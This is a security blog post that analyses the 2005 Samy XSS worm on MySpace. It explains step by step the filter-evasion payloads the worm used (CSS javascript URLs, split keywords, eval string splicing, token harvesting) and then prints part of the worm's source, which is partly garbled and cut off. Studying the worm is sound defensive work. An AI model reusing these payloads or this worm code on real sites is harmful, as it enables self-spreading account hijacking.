<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2"><link rel="apple-touch-icon" sizes="180x180" href="/en/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/en/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/en/images/favicon-16x16-next.png"><link rel="mask-icon" href="/en/images/logo.svg" color="#222"><meta name="google-site-verification" content="7yRqtT6cCpC-_R-rzM9gUoQGmheV9OZAUKIXrbAsyqE"><link rel="stylesheet" href="/en/css/main.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous"><script class="next-config" data-name="main" type="application/json">{"hostname":"sunra.top","root":"/en/","images":"/en/images","scheme":"Muse","darkmode":false,"version":"8.16.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/en/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/en/js/config.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8623125811074939" crossorigin="anonymous"></script><script>!function(e,p,s,r){if(void 0===e.webpushr){e.webpushr=e.webpushr||function(){(e.webpushr.q=e.webpushr.q||[]).push(arguments)};var d,t=p.getElementsByTagName(s)[0];(d=p.createElement(s)).id="webpushr-jssdk",d.async=1,d.src="https://cdn.webpushr.com/app.min.js",t.parentNode.appendChild(d)}}(window,document,"script"),webpushr("setup",{key:"BEQjc-0d1Q1CubrYZ2e2XXv5Is0ZCd3CtrNLet06owkUWK68qkxHpho2mKdnj2vpGdxddRDxRYthLuMwrTqfSB4"})</script><meta name="description" content="The last blog analyzed the classification and basic combat methods of XSS, and this time I will continue to accept an XSS virus. DefinitionFirst, let’s analyze what is the XSS worm virus. It is a cros"><meta property="og:type" content="article"><meta property="og:title" content="XSS Worm Definition and Practical Analysis"><meta property="og:url" content="https://sunra.top/en/posts/17764/index.html"><meta property="og:site_name" content="Origin of Ray"><meta property="og:description" content="The last blog analyzed the classification and basic combat methods of XSS, and this time I will continue to accept an XSS virus. DefinitionFirst, let’s analyze what is the XSS worm virus. It is a cros"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2021-09-19T13:44:22.000Z"><meta property="article:modified_time" content="2023-08-12T13:44:04.386Z"><meta property="article:author" content="Ray Sun"><meta property="article:tag" content="Technology Sharing Using Tutorials Principles Front End Computer Graphics"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://sunra.top/en/posts/17764/"><script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://sunra.top/en/posts/17764/","path":"posts/17764/","title":"XSS Worm Definition and Practical Analysis"}</script><script class="next-config" data-name="calendar" type="application/json">""</script><title>XSS Worm Definition and Practical Analysis | Origin of Ray</title><script async src="https://www.googletagmanager.com/gtag/js?id=G-KEJ1L66CKC"></script><script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-KEJ1L66CKC","only_pageview":false}</script><script src="/en/js/third-party/analytics/google-analytics.js"></script><script src="/en/js/third-party/analytics/baidu-analytics.js"></script><script async src="https://hm.baidu.com/hm.js?cc2e15dfd66849cf1d7843d0d532438e"></script><link rel="dns-prefetch" href="https://blog-comments-3w44.vercel.app/"><noscript><link rel="stylesheet" href="/en/css/noscript.css"></noscript><link rel="alternate" href="/en/atom.xml" title="Origin of Ray" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><div class="column"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="Toggle navigation bar" role="button"><span class="toggle-line"></span><span class="toggle-line"></span><span class="toggle-line"></span></div></div><div class="site-meta"><a href="/en/" class="brand" rel="start"><i class="logo-line"></i><p class="site-title">Origin of Ray</p><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">Lift the fog of the Internet together</p></div><div class="site-nav-right"><div class="toggle popup-trigger" aria-label="Search" role="button"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/en/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/en/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/en/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-english"><a href="https://sunra.top/en" rel="section"><i class="fa fa-language fa-fw"></i>English</a></li><li class="menu-item menu-item-中文"><a href="https://sunra.top/" rel="section"><i class="fa fa-language fa-fw"></i>中文</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i> Search</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"> <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="Searching..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close" role="button"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class="search-result-icon"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></header><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc"> Table of Contents</li><li class="sidebar-nav-overview"> Overview</li></ul><div class="sidebar-panel-container"><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Definition"><span class="nav-number">1.</span> <span class="nav-text">Definition</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#General-principles"><span class="nav-number">2.</span> <span class="nav-text">General principles</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-first-worm-Samy"><span class="nav-number">3.</span> <span class="nav-text">The first worm: Samy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Prerequisite-for-entry-into-force-MySpace-website-analysis"><span class="nav-number">3.1.</span> <span class="nav-text">Prerequisite for entry into force, MySpace website analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Source-code-analysis"><span class="nav-number">3.2.</span> <span class="nav-text">Source code analysis</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="Ray Sun" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg"><p class="site-author-name" itemprop="name">Ray Sun</p><div class="site-description" itemprop="description">Lift the fog of the Internet together</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/en/archives/"><span class="site-state-item-count">268</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"> <a href="/en/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">categories</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><a href="https://github.com/Sun668" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Sun668" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i> GitHub</a></span><span class="links-of-author-item"><a href="mailto:947692259@qq.com" title="E-Mail → mailto:947692259@qq.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i> E-Mail</a></span></div><div class="cc-license animated" itemprop="license"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a></div></div></div></div><div class="wechat_channel" style="width:50%;margin-left:25%;margin-bottom:10px"><br> <img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1685836114/origin-of-ray/wechat_channel_zmg0hw.jpg"></div><div class="wechat_channel" style="width:50%;margin-left:25%"><br> <span>最好用的程序员的一站式工具平台，拥有最好用的GPT及其Prompt列表，最精准的翻译功能和全网搜索功能</span> <img src="https://origin-of-ray.oss-cn-shenzhen.aliyuncs.com/rannie_share.png"></div></aside></div><div class="main-inner post posts-expand"><div class="post-block"><article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en"><link itemprop="mainEntityOfPage" href="https://sunra.top/en/posts/17764/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg"><meta itemprop="name" content="Ray Sun"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Origin of Ray"><meta itemprop="description" content="Lift the fog of the Internet together"></span><span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork"><meta itemprop="name" content="XSS Worm Definition and Practical Analysis | Origin of Ray"><meta itemprop="description" content></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> XSS Worm Definition and Practical Analysis</h1><div class="post-meta-container"><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2021-09-19 21:44:22" itemprop="dateCreated datePublished" datetime="2021-09-19T21:44:22+08:00">2021-09-19</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i></span> <span class="post-meta-item-text">Edited on</span> <time title="Modified: 2023-08-12 21:44:04" itemprop="dateModified" datetime="2023-08-12T21:44:04+08:00">2023-08-12</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/en/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a></span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i></span> <span class="post-meta-item-text">Waline:</span><a title="waline" href="/en/posts/17764/#waline" itemprop="discussionUrl"><span class="post-comments-count waline-comment-count" data-path="/en/posts/17764/" itemprop="commentCount"></span></a></span></div></div></header><div class="post-body" itemprop="articleBody"><p>The last blog analyzed the classification and basic combat methods of XSS, and this time I will continue to accept an XSS virus.</p><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>First, let’s analyze what is the XSS worm virus.</p><p>It is a cross-site scripting virus, mostly written in JavaScript, to break through the security restrictions of the browser, it is based on social engineering to induce users to click on the malicious invitation link to visit the site on the site to infect users, infected users and then send content containing worms to continue to infect secure users.</p><span id="more"></span><h2 id="General-principles"><a href="#General-principles" class="headerlink" title="General principles"></a>General principles</h2><p>Based on stored XSS vulnerabilities, attackers implant malicious code on web pages.</p><ul><li>Send fake invitation links.</li><li>The user clicks on the link to be infected.</li><li>Send fake invitation link to friends of newly infected users.</li></ul><p>This is a spread, spread mode, infection efficiency is very high, XSS worm infection speed is with the Web application user visits geometric increase<br>The xss worm is based on xss, so the functions that xss can exploit. Worms can exploit, and because xss worms are more propagable and harmful than stored XSS vulnerabilities.</p><h2 id="The-first-worm-Samy"><a href="#The-first-worm-Samy" class="headerlink" title="The first worm: Samy"></a>The first worm: Samy</h2><p>At the age of 19, Samy Kamkar launched an attack on the MySpace.com (social networking site). Samy Kamkar’s worm was executed by more than a million people in 20 hours. Everyone added a sentence after their self-introduction: “but most of all, Samy is my hero.”</p><p>In 2005, Samy Kamkar was struggling to make friends with his new account on the Myspace social networking site. His initial idea was to make his account page more flashy so that more girls would follow him. During his exploration of the Myspace.com page, he found that the page could embed javascript code, so his idea changed from “make the account page more flashy” to, every user who browses his account page will add him as a friend, and every user who adds his friend’s account page will embed the same code, and friends of friends will also add him as a friend… In less than a day, Samy’s worm infected 1 million users, making it the largest XSS worm in the history of web security.</p><h3 id="Prerequisite-for-entry-into-force-MySpace-website-analysis"><a href="#Prerequisite-for-entry-into-force-MySpace-website-analysis" class="headerlink" title="Prerequisite for entry into force, MySpace website analysis"></a>Prerequisite for entry into force, MySpace website analysis</h3><p>Well, let’s dive a little bit deeper into how these issues arise, the context in which it occurs, and how it works in general.</p><p>1) The Myspace website filters many tags. In fact, they seem to only keep the ‘&lt; a &gt;’ tag, ‘&lt; img &gt;’ tag, and ‘&lt; div &gt;’ tag… there may be others. They prohibit the ‘&lt; script &gt;’ tag, &lt; body &gt; tag, onClick tag attribute, all tag attributes prefixed with on, href attribute containing javascript code, etc. However, some browsers (IE, some versions of Safari, etc.) allow javascript code in CSS tags. For example:</p><p><code>&lt;div style=&quot;background:url(&#39;javascript:alert(1)&#39;)&quot;&gt;</code><br>1) Because we have used single and double quotes, we can no longer use quotes in the &lt; div &gt; tag. This makes JS code very difficult to write. To solve this problem, we use an expression to store JS code and then execute it through the name query:</p><p><code>&lt;div id=&quot;mycode&quot; expr=&quot;alert(&#39;hah!&#39;)&quot; style=&quot;background:url(&#39;javascript:eval(document.all.mycode.expr)&#39;)&quot;&gt;</code><br>3) Very good! Now we can use single quotes in javascript code. However, Myspace filters sensitive words such as “javascript”. To get around this limitation, we learned that some browsers parse “java\ nscript” as “javascript” (i.e. java &lt; newline &gt; script):</p><p><code>&lt;div id=&quot;mycode&quot; expr=&quot;alert(&#39;hah!&#39;)&quot; style=&quot;background:url(&#39;java script:eval(document.all.mycode.expr)&#39;)&quot;&gt;</code><br>4) OK, even if we make single quotes work, sometimes we need double quotes. We can escape double quotes, for example: “foo\” bar “. But Myspace guessed I would do it… They filter all escaped quotes, whether single or double quotes. However, we can convert numerical values to ASCII code in javascript to generate quotes:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mycode&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;alert(&#x27;double quote: &#x27; + String.fromCharCode(34))&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background:url(&#x27;java </span></span></span><br><span class="line"><span class="string"><span class="tag">script:eval(document.all.mycode.expr)&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5) In order to submit the code to the user’s account page, we need to get the source code of the page. Aha, we can use document.body.innerHTML to get the source code of the page, and the account page will keep the ID of the user who viewed the page (even once). Myspace guessed my idea again and filtered all “innerHTML”. To get around this limitation, we use eval () to call two strings, splice them together, and combine them into “innerHTML”:</p><p><code>alert(eval(&#39;document.body.inne&#39; + &#39;rHTML&#39;));</code><br>6) It’s time to visit other pages. We may think of using the iframe tag, but many times (even when hidden), iframes are not that effective, and users will obviously be aware that “something” is happening. So, we use AJAX (XML-HTTP) to construct GET and POST requests. However, the Myspace website filters the necessary keyword for an XML-HTTP request: “onreadystatechange”. Again, we use eval to bypass it. Another reason for choosing XML-http is that the necessary cookies for performing operations on Myspace websites can easily be sent to the background:</p><p><code>eval(&#39;xmlhttp.onread&#39; + &#39;ystatechange = callback&#39;);</code><br>7) It’s time to send a GET status to the user’s account page so we can get their current watchlist. We don’t want to delete any friends we follow, we just want to add ourselves to their watchlist. If our GET request gets their account page, we can grab their hero and save it for later use. As mentioned earlier, this is easy to do with XML-HTTP, but we must get the ID of the user browsing the page. As we said above, we can achieve this by obtaining the page source code. However, now we need to search for a special word on this page. So we start searching, and if we do, the search will always find the code we wrote ourselves, because our code contains the word we are looking for… We tell the computer “If this page contains the word’foo ‘, then do the following”, and this statement will always return true, because it will always find the word in the code that performs the search. We get around this problem by combining eval () with string:</p><p><code>var index = html.indexOf(&#39;frien&#39; + &#39;dID&#39;);</code><br>8) So far, we’ve got the watchlist. Next, add me as a friend by constructing an XML-http POST request to send to the Add Friends page. Oh come on, this doesn’t work! Why doesn’t it work? We’re on profile.myspace.com, but POST requests to add friends can only be requested on www.myspace.com. Not a big deal, but XML-HTTP doesn’t allow cross-domain GET/POST requests. To get around this restriction, we’ll jump to the same url www.myspace.com. You can still access the account page on the www.myspace.com, so reload the page to the domain name we can POST:</p><p><code>if (location.hostname &#39;profile.myspace.com&#39;) document.location = &#39;http://www.myspace.com&#39; + location.pathname + location.search;</code><br>9) We can finally make a POST request! However, when we send a POST request, it will not successfully add a friend. Why is this happening? The Myspace website generates a random hash value for the page that needs to be POST (for example, the “Are you sure you want to add this user as a friend” page). If this hash value is not included in the POST request, the request will not take effect. In order to solve this problem, we pretend to be a browser. Before adding friends, we use GET to obtain the corresponding page, parse its source code to obtain this hash value, and then attach this hash value when constructing a POST request.</p><p>10) When the POST request is complete, we also add a follower to the watchlist and attach the worm code. The code is placed in the same place as the new follow, so we only need to send a POST request. To get the new hash value, we need to GET the request to the page, but before that, we have to regenerate the worm code sent by POST. The easiest way is to grab the source code in our account page, parse the worm code, and then POST it out. This can be done, but now all the code is garbled! Ah, we need to URL encode or escape the code so that the POST request can send this code correctly. Strange, still not working. Obviously, the URL encoding and escape functions of javascript do not escape everything necessary, so we need to manually perform some substitutions to allow key data to be successfully escaped. We added a short paragraph of text “But most importantly, samy is my idol”. Immediately afterwards, we added all the worm code. Now, we have a “self-replicating” code, which you can call a worm if you want.</p><p>11) There are also some restrictions, such as the maximum length of label attribute assignment, which will cause other problems, and require compressed code, no spaces, vague variable names, functions to reuse</p><h3 id="Source-code-analysis"><a href="#Source-code-analysis" class="headerlink" title="Source code analysis"></a>Source code analysis</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">mycode</span> <span class="attr">style</span>=<span class="string">”BACKGROUND:</span> <span class="attr">url</span>(&#x27;<span class="attr">javascript:eval</span>(<span class="attr">document.all.mycode.expr</span>)&#x27;)” <span class="attr">expr</span>=<span class="string">”</span></span></span><br><span class="line"><span class="tag"><span class="attr">Var</span> <span class="attr">B</span> = <span class="string">String.fromCharCode</span> (<span class="attr">34</span>);//<span class="attr">double</span> <span class="attr">quotes</span></span></span><br><span class="line"><span class="tag"><span class="attr">Var</span> <span class="attr">A</span> = <span class="string">String.fromCharCode</span> (<span class="attr">39</span>);//<span class="attr">single</span> <span class="attr">quotes</span></span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">g</span> () &#123; // <span class="attr">returns</span> <span class="attr">the</span> <span class="attr">doc</span> <span class="attr">content</span> <span class="attr">and</span> <span class="attr">does</span> <span class="attr">browser</span> <span class="attr">compatibility</span> <span class="attr">processing</span></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">C</span>;</span></span><br><span class="line"><span class="tag">    <span class="attr">try</span> &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">var</span> <span class="attr">D</span> = <span class="string">document.body.createTextRange();</span> <span class="attr">C</span> = <span class="string">D.htmlText</span></span></span><br><span class="line"><span class="tag">    &#125; <span class="attr">catch</span> (<span class="attr">e</span>) &#123;&#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span> (<span class="attr">C</span>) &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">return</span> <span class="attr">C</span></span></span><br><span class="line"><span class="tag">    &#125; <span class="attr">else</span> &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">return</span> <span class="attr">eval</span>(&#x27;<span class="attr">document.body.innerHTML</span>&#x27;)</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">getFromURL</span> (<span class="attr">BF</span>, <span class="attr">BG</span> ) &#123; // <span class="attr">Get</span> <span class="attr">the</span> <span class="attr">value</span> <span class="attr">of</span> <span class="attr">BG</span> <span class="attr">from</span> <span class="attr">the</span> <span class="attr">string</span> <span class="attr">BF</span></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">T</span>;</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span> (<span class="attr">BG</span>  &#x27;<span class="attr">Mytoken</span>&#x27;) &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">T</span> = <span class="string">B</span></span></span><br><span class="line"><span class="tag">    &#125; <span class="attr">else</span> &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">T</span> = <span class="string">&#x27; &amp; &#x27;</span></span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">U</span> = <span class="string">BG</span> + &#x27; = <span class="string">&#x27;;</span></span></span><br><span class="line"><span class="string"><span class="tag">    var V = BF.indexOf(U) + U.length;</span></span></span><br><span class="line"><span class="string"><span class="tag">    var W = BF.substring(V, V + 1024);</span></span></span><br><span class="line"><span class="string"><span class="tag">    var X = W.indexOf(T);</span></span></span><br><span class="line"><span class="string"><span class="tag">    var Y = W.substring(0, X);</span></span></span><br><span class="line"><span class="string"><span class="tag">    return Y</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">function getData(AU) &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">    M = getFromURL (AU, &#x27;</span><span class="attr">friendID</span> &#x27;); // <span class="attr">Get</span> <span class="attr">the</span> <span class="attr">value</span> <span class="attr">of</span> <span class="attr">friendID</span> <span class="attr">from</span> <span class="attr">AU</span></span></span><br><span class="line"><span class="tag">    <span class="attr">L</span> = <span class="string">getFromURL</span> (<span class="attr">AU</span>, &#x27;<span class="attr">MyToken</span>&#x27;)//<span class="attr">Get</span> <span class="attr">the</span> <span class="attr">value</span> <span class="attr">of</span> <span class="attr">MyToken</span> <span class="attr">from</span> <span class="attr">AU</span></span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">getQueryParams</span> () &#123; // <span class="attr">convert</span> <span class="attr">the</span> <span class="attr">params</span> <span class="attr">string</span> <span class="attr">in</span> <span class="attr">the</span> <span class="attr">URL</span> <span class="attr">into</span> <span class="attr">an</span> <span class="attr">object</span></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">E</span> = <span class="string">document.location.search;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">F</span> = <span class="string">E.substring(1,</span> <span class="attr">E.length</span>)<span class="attr">.split</span>(&#x27; &amp; &#x27;);</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">AS</span> = <span class="string">new</span> <span class="attr">Array</span>();</span></span><br><span class="line"><span class="tag">    <span class="attr">for</span> (<span class="attr">var</span> <span class="attr">O</span> = <span class="string">0;</span> <span class="attr">O</span> &lt; <span class="attr">F.length</span>; <span class="attr">O</span>++) &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">var</span> <span class="attr">I</span> = <span class="string">F[O].split(</span>&#x27; = <span class="string">&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">        AS[I[0]] = I[1]</span></span></span><br><span class="line"><span class="string"><span class="tag">    &#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">    return AS</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">var J;</span></span></span><br><span class="line"><span class="string"><span class="tag">var AS = getQueryParams();</span></span></span><br><span class="line"><span class="string"><span class="tag">var L = AS[&#x27;</span><span class="attr">Mytoken</span>&#x27;];</span></span><br><span class="line"><span class="tag"><span class="attr">var</span> <span class="attr">M</span> = <span class="string">AS[</span>&#x27;<span class="attr">friendID</span>&#x27;];</span></span><br><span class="line"><span class="tag"><span class="attr">if</span> (<span class="attr">location.hostname</span>  &#x27;<span class="attr">profile.myspace.com</span>&#x27;) &#123; // <span class="attr">当前在个人主页</span>，<span class="attr">就跳转回myspace的主页</span></span></span><br><span class="line"><span class="tag">    <span class="attr">document.location</span></span></span><br><span class="line"><span class="tag">        = <span class="string">&#x27;http: //www.myspace.com&#x27;</span> + <span class="attr">location.pathname</span> + <span class="attr">location.search</span></span></span><br><span class="line"><span class="tag">&#125; <span class="attr">else</span> &#123;</span></span><br><span class="line"><span class="tag">    <span class="attr">If</span> (! <span class="attr">M</span> ) &#123; // <span class="attr">if</span> <span class="attr">friendID</span> <span 